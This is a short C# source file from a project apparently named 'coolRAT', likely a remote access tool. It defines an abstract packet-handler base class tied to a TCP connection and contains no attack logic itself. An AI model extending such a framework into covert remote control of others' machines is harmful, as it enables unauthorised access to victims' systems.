using coolRAT.Libs.Packets;

namespace coolRAT.Libs.PacketHandlers
{
    public abstract class PacketHandler
    {
        public TcpConnection Connection;

        public PacketHandler(TcpConnection connection)
        {
            Connection = connection;
        }

        public abstract void HandlePacket(object sender, string packet_raw);
    }
}